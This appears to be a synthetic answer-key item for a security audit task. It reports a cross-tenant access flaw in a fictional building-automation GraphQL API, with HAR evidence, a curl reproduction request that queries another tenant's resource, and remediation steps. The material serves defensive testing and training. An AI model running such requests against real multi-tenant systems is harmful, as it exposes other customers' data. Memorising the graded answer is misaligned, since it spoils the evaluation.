# Expected Response

## System
- Domain: Smart Home / Building Automation
- System: NeoBuild BAS Platform
- Example ID: GQL-0143

## Priority Findings

### Finding 1: Smart Home BAS — Metadata Attribute Side-Channel Exposes Cross-Tenant Device Config (Pattern 2.2)
**Severity:** High
**Category:** BAC / Metadata/Attribute Side-Channel

**Summary:**
Per §5.0 (Pattern 2.2 — metadata/attribute side-channel): The `getResource` resolver exposes internal metadata attributes (including `internalNotes`) that leak cross-tenant device state and configuration without explicit authorization. An attacker from `tenant-0db4` queried `getResource(id: "R-2143")` and received building automation system data belonging to `tenant-d181`, including `sensitiveField: "CONFIDENTIAL-0db4d181"` and `internalNotes: "Internal data exposed"`. In Smart Home / BAS, this exposes HVAC schedules, access control configurations, and occupancy data.

**Evidence from HAR:**
- Request: `POST https://api.neobuild-bas-platfor.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-0db4`
- Query: `getResource(id: "R-2143") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`: `tenantId: "tenant-d181"`, `ownerId: "other-user-0db4d181"`, `sensitiveField: "CONFIDENTIAL-0db4d181"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-0db4d181`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 2.2 | Metadata side-channel, internalNotes exposed |
| HAR request | x-tenant-id | Attacker tenant-0db4 |
| HAR response | tenantId | Cross-tenant BAS data tenant-d181 |
| HAR response | internalNotes | Internal data exposed (side-channel) |

## Steps to Reproduce

### Step 1 — getResource metadata side-channel (HAR)
```bash
curl -s -X POST https://api.neobuild-bas-platfor.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-0db4" \
  -d '{"query": "query { getResource(id: \"R-2143\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `tenant-d181` BAS metadata returned. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Remove `internalNotes` from schema or restrict to admin role only.
3. Field-level access control: prohibit cross-tenant metadata access.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
